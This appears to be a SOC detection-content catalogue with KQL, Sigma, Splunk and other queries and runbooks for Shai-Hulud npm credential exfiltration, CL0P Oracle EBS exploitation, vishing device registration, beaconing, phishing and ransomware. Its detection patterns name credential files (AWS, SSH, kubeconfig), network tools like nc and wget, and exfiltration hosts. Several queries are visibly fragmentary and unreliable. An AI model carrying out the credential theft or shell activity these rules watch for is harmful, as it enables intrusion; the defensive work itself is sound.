1) Triage: pull the full process tree for the offending node PID — confirm parent is npm/yarn/pnpm install (vs an IDE or aws-cdk). Get the package.json / npm-debug.log on the host; identify the package + version executing postinstall. Check DeviceNetworkEvents for the same node PID hitting api.github.com, raw.githubusercontent.com, webhook.site, or 169.254.169.254 (cloud IMDS). 2) Contain: isolate the host via Defender Live Response, rotate ALL credentials present in the touched files (AWS access keys, SSH keys, kubeconfig tokens, GCP service-account JSON), revoke any GitHub PATs the user has. 3) Hunt: pivot on the package name across all DevEnv/CI hosts (`DeviceProcessEvents | where ProcessCommandLine has "<pkg>"`); search for newly-created public GitHub repos owned by impacted users with description containing 'Sha1-Hulud' or 'Shai-Hulud'; scan CloudTrail for `GetSecretValue` / `sts:GetCallerIdentity` from any compromised key.
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe","node","npm.exe","npm","yarn.exe","yarn","pnpm.exe","pnpm")
| where FolderPath has_any (@"\.aws\credentials", @"/.aws/credentials", @"\.ssh\id_rsa", @"/.ssh/id_rsa", @"\.ssh\id_ed25519", @"/.ssh/id_ed25519", @"\.kube\config", @"/.kube/config", @"application_default_credentials.json", @"\gcloud\credentials.db")
| where ActionType in ("FileCreated","FileModified","FileRenamed","FileAccessed")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath, FileName, ActionType, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName matches regex @"(?i)\\(node|npm|yarn|pnpm)(\.exe)?$" or ActingProcessName matches regex @"(?i)/(node|npm|yarn|pnpm)$"
| where TargetFilePath matches regex @"(?i)(\.aws[\\/]credentials|\.ssh[\\/]id_(rsa|ed25519|ecdsa)|\.kube[\\/]config|application_default_credentials\.json|gcloud[\\/]credentials\.db)"
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc

Shai-Hulud exfiltration: node.exe POSTs to api.github.com creating public repo AIActions on Objectives Medium
Detects the Shai-Hulud worm's exfiltration channel — a node/npm process making API calls to api.github.com on a non-developer host (or burst of repo-creation API traffic). The worm dumps stolen secrets into a newly-created public GitHub repo tagged 'Sha1-Hulud: The Second Coming'. Rationale: Article ties TGR-CRI-1135 (Shai-Hulud author) to the open-source release on 2026-05-13. Datadog Security Labs and Unit 42 confirm exfil channel is a public GitHub repo created via api.github.com — pairing the credential-file read (UC1) with an outbound github.com call from the same node PID inside 10 minutes is high-fidelity vs background developer noise. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.upwind.io/feed/shai-hulud-2-npm-supply-chain-worm-attack • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
ATT&CKT1567.002 T1102 T1041
Data sourcesNetwork_Traffic.All_Traffic Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Genuine `npm publish` or `gh release create` workflows from developer laptops
  • CI runners using @octokit/rest to update repo metadata as part of release pipelines
  • Renovate / Dependabot agents reading project files then posting PRs via the GitHub API
  • semantic-release postinstall hooks that legitimately touch ~/.npmrc + github.com
  • Internal package registries proxied through api.github.com Enterprise
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("@octokit","semantic-release","gh release","renovate","dependabot")) and not (DeviceName matches regex @"(?i)(jenkins|gha-runner|build-agent|renovate)")
Response runbook
1) Triage: review the HTTP body size of POSTs from the offending node PID — Shai-Hulud uploads double-base64-encoded blobs ~kB-MB range. Run `gh api /users/<user>/repos --paginate` and look for repos created in the last 24h whose description matches 'Shai-Hulud' / 'Sha1-Hulud' / contains the package@version string. 2) Contain: revoke all GitHub PATs / fine-grained tokens for the user, force-rotate the AWS/GCP/k8s creds touched in UC1, delete the exfil repo via GitHub Support (it's already harvested but limits secondary use). 3) Hunt: correlate with UC1 hits across the org; query GitHub audit log for `repo.create` events authored by tokens issued from compromised endpoints; sweep TruffleHog over the GitHub Enterprise org for posted secrets.
let creds = DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessFileName in~ ("node.exe","npm.exe","yarn.exe","pnpm.exe")
| where FolderPath has_any (@"\.aws\credentials", @"/.aws/credentials", @"\.ssh\id_", @"/.ssh/id_", @"\.kube\config", @"application_default_credentials.json")
| project CredTime=Timestamp, DeviceId, InitiatingProcessId;

| where RemoteUrl has_any ("api.github.com","uploads.github.com")

| where Timestamp between (CredTime .. CredTime + 10m)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteUrl, RemoteIP, RemotePort, CredTime
| order by Timestamp desc

| where TimeGenerated > ago(1d)

| where TargetFilePath matches regex @"(?i)(\.aws[\\/]credentials|\.ssh[\\/]id_|\.kube[\\/]config|application_default_credentials\.json)"
| project CredTime=TimeGenerated, DvcHostname, ActingProcessId;
ImWebSession

| where Url has_any ("api.github.com","uploads.github.com")

Bling Libra: Entra device join immediately after vishing-driven MFA registration AIInstallation High
Detects Bling Libra's (ShinyHunters / UNC6040) post-vishing persistence pattern — within minutes of a successful interactive sign-in from a new location/IP, the same identity registers a new device (and frequently a new MFA method) on Entra ID. The article confirms the playbook is unchanged: vishing → credential+MFA intercept → register own device for persistence. Rationale: Article states Bling Libra 'continues to use vishing for initial access… and ultimately registering their own devices to establish persistence within targeted environments.' Mandiant/Google Cloud and BankInfoSecurity writeups confirm device-registration-within-30-minutes-of-suspicious-sign-in as the high-fidelity correlation. The temporal join is what distinguishes attacker registration from a user's own new laptop enrollment. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/defense-against-shinyhunters-cybercrime-saas • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://www.bankinfosecurity.com/hanging-up-on-shinyhunters-experts-detail-vishing-defenses-a-30657
ATT&CKT1556.006 T1098.005 T1566.004
Data sourcesAuthentication Change
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Genuine new-hire onboarding enrolling laptop+phone in a single session
  • User getting a new corporate laptop and enrolling from the IT helpdesk's external IP
  • Traveling exec signing in from a hotel and enrolling their iPad
  • Conditional Access compliant-device evaluation triggering re-registration
  • Autopilot device join from a freshly-imaged endpoint over a public Wi-Fi
Suppression filter
| where not (SignInIP in (dynamic(["<corp-helpdesk-egress-ip>","<onboarding-vlan-ip>"]))) and not (AppDisplayName has_any ("Microsoft Intune","Windows Autopilot"))
Response runbook
1) Triage: in Entra portal pull the registered device's join type (AzureAD, Hybrid), OS, and trust state; cross-check the registering IP against the user's normal locations (last 90d sign-in geo); ask the user (out-of-band, NOT via email — vishing actor may be monitoring inbox) whether they enrolled. 2) Contain: in Entra disable the new device object, revoke all refresh tokens for the user (`Revoke-MgUserSignInSession`), force password reset and re-MFA registration, block the source IP via CA named-location. 3) Hunt: pivot on AppDisplayName/ResourceDisplayName the same identity touched in the next 24h (Salesforce, Snowflake, Workday — Bling Libra's typical SaaS targets); query MailItemsAccessed for forwarding rules; look for OAuth app consents granted from the new device.
let lookback = 7d;
let signins = AADSignInEventsBeta
| where Timestamp > ago(lookback)
| where ErrorCode == 0
| where IsInteractive == true
| where RiskLevelDuringSignIn in ("medium","high") or RiskState == "atRisk" or NetworkLocationDetails !has "trustedNamedLocation"
| project SignInTime=Timestamp, AccountUpn, SignInIP=IPAddress, SignInCountry=Country, AppDisplayName;
CloudAppEvents

| where Application == "Office 365" or ApplicationId == 11161
| where ActionType in ("Add device","Add registered owner to device","Update device","Register device")
| extend Upn = tostring(AccountDisplayName)
| join kind=inner signins on $left.AccountObjectId == $right.AccountUpn
| where Timestamp between (SignInTime .. SignInTime + 30m)
| project Timestamp, SignInTime, DelaySec=datetime_diff('second',Timestamp,SignInTime), AccountDisplayName, SignInIP, SignInCountry, IPAddress, ActionType, ObjectName, RawEventData
| order by Timestamp desc
let lookback = 7d;
let signins = SigninLogs
| where TimeGenerated > ago(lookback)
| where ResultType == 0
| where IsInteractive == true
| extend Country = tostring(LocationDetails.countryOrRegion)
| where RiskLevelDuringSignIn in ("medium","high") or RiskState == "atRisk" or isnotempty(Country)
| project SignInTime=TimeGenerated, UserPrincipalName, SignInIP=IPAddress, Country, AppDisplayName;
AuditLogs
| where TimeGenerated > ago(lookback)
| where LoggedByService in ("Device Registration Service","Core Directory")
| where OperationName in ("Add device","Add registered owner to device","Register device","Update device")
| where Result == "success"
| extend Upn = tostring(InitiatedBy.user.userPrincipalName)
| extend AuditIP = tostring(InitiatedBy.user.ipAddress)
| extend TargetDevice = tostring(TargetResources[0].displayName)
| join kind=inner signins on $left.Upn == $right.UserPrincipalName
| where TimeGenerated between (SignInTime .. SignInTime + 30m)
| project TimeGenerated, SignInTime, DelaySec=datetime_diff('second',TimeGenerated,SignInTime), Upn, SignInIP, Country, AuditIP, OperationName, TargetDevice
| order by TimeGenerated desc

Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget AIExploitation High
Hunts the post-exploit footprint of CVE-2025-61882 in Oracle E-Business Suite (Concurrent Processing) — the Java app-server process (java/oracle) spawning OS shells, wget, curl, perl or python is the canonical Cl0p webshell-drop pattern observed by Mandiant/Google Cloud against EBS 12.2.x. Rationale: Article names CVE-2025-61882 as Hazy Scorpius/CL0P's vector into Oracle EBS. Google Cloud TI and Oracle's own advisory confirm Cl0p drops Java/JSP webshells via the Concurrent Processing component; java/FNDLIBR spawning a shell/downloader on an EBS host is the cleanest live-exploit pivot. Filter for EBS-specific paths (appsutil, FMW_Home, comn/util) keeps this scoped to actual EBS servers. Cross-checked against: • https://www.oracle.com/security-alerts/alert-cve-2025-61882.html • https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation • https://www.tenable.com/blog/cve-2025-61882-faq-oracle-e-business-suite-zero-day-cl0p-and-july-2025-cpu • https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild/
ATT&CKT1190 T1059.004 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Oracle EBS patching (adop / adcfgclone / autoconfig) spawning bash to run admin scripts
  • Concurrent programs (custom XML Publisher reports) that legitimately exec wget to pull data
  • DBA running adstrtal.sh / adstpall.sh start-stop scripts via java wrapper
  • Backup scripts (RMAN wrappers) launched by FNDLIBR cron
  • Monitoring agents (Oracle Enterprise Manager) shelling out for OS metric collection
Suppression filter
| where ProcessCommandLine !has_any ("adstrtal","adstpall","adcfgclone","adop","autoconfig","rman","emagent")
| where InitiatingProcessCommandLine !has "AutoPatch"
Response runbook
1) Triage: confirm patch level — Oracle's October 2025 CPU patches CVE-2025-61882; if unpatched, assume exploitation. Pull the full child-process tree and any files written in the last 24h under $APPL_TOP, $COMMON_TOP, /tmp; grep web/app logs for the IOC IPs in Oracle's advisory. Hash any new .jsp/.class files in $OA_HTML. 2) Contain: take the EBS app server out of load-balancer rotation, snapshot for forensics, then apply the CPU patch + remove any webshells under $OA_HTML / FMW_Home/user_projects. Rotate all DB credentials, APPS schema password, WLS admin password. 3) Hunt: search egress logs for connections to the published Cl0p IOC IPs (Oracle advisory + Mandiant blog); check for compressed exfil archives under /tmp, /var/tmp, $LOG_HOME; review CL0P leak site for victim listing if exfil suspected.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("java","java.exe","FNDLIBR","FNDLIBR.exe","httpd","httpd.exe")
| where InitiatingProcessFolderPath has_any ("oracle","EBS","fs_inst","appsutil","FMW_Home","comn/util","Concurrent")
| where FileName in~ ("sh","bash","ksh","zsh","cmd.exe","powershell.exe","pwsh.exe","wget","curl","perl","python","python3","nc","ncat","certutil.exe")
| where ProcessCommandLine !has "adstrtal" and ProcessCommandLine !has "adstpall"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, ProcessCommandLine, ProcessId
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName matches regex @"(?i)(\\|/)(java|java\.exe|FNDLIBR|httpd)(\.exe)?$"
| where ParentProcessCommandLine matches regex @"(?i)(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)"
| where ActingProcessName matches regex @"(?i)(\\|/)(sh|bash|ksh|zsh|cmd\.exe|powershell\.exe|pwsh\.exe|wget|curl|perl|python3?|nc|ncat|certutil\.exe)$"
| where ActingProcessCommandLine !has "adstrtal" and ActingProcessCommandLine !has "adstpall"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: Oracle EBS Concurrent Processing Spawns OS Shell or Downloader (CVE-2025-61882)
id: 1e7a8b04-3c6f-4a18-9b6d-72bb5a9e2c11
status: experimental
description: Detects Oracle E-Business Suite java/FNDLIBR/httpd parent processes spawning shells, wget, curl, perl, python or nc — the post-exploit footprint of CVE-2025-61882 (Cl0p / Hazy Scorpius extortion campaign).
references:
  - https://unit42.paloaltonetworks.com/cyber-extortion-economy/
  - https://www.oracle.com/security-alerts/alert-cve-2025-61882.html
  - https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access
  - attack.t1190
  - attack.t1505.003
  - cve.2025.61882
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/java'
      - '/FNDLIBR'
      - '/httpd'
    ParentCommandLine|contains:
      - 'oracle'
      - 'EBS'
      - 'fs_inst'
      - 'appsutil'
      - 'comn/util'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/ksh'
      - '/wget'
      - '/curl'
      - '/perl'
      - '/python'
      - '/python3'
      - '/nc'
      - '/ncat'
  filter_legit:
    CommandLine|contains:
      - 'adstrtal'
      - 'adstpall'
      - 'adcfgclone'
  condition: selection_parent and selection_child and not filter_legit
falsepositives:
  - Oracle EBS patching (autoconfig, adop) which legitimately spawns shells under java
  - Administrative concurrent programs that shell out by design
level: high
source:linux.auditd @auditd.type:EXECVE @process.parent.executable.path:(*/java OR */FNDLIBR OR */httpd) @process.executable.path:(*/sh OR */bash OR */ksh OR */wget OR */curl OR */perl OR */python OR */python3 OR */nc OR */ncat) -@process.command_line:(*adstrtal* OR *adstpall* OR *adcfgclone*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(java|FNDLIBR|httpd)$/i
| regex("(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)", field=ParentImageFileName)
| ImageFileName=/\/(sh|bash|ksh|zsh|wget|curl|perl|python3?|nc|ncat)$|\\(cmd|powershell|pwsh|certutil)\.exe$/i
| NOT (regex("(adstrtal|adstpall|adcfgclone)", field=CommandLine))
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-61882", "CVE-2026-45321")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    [| tstats summariesonly=false earliest(_time) AS exec_time

         by Processes.dest, Processes.user

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user

    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user

    [| tstats summariesonly=false count

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |

    cscript, mshta, rundll32, regsvr32 — classic macro / embedded-
    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate automation macros in trusted internal documents
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.

Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
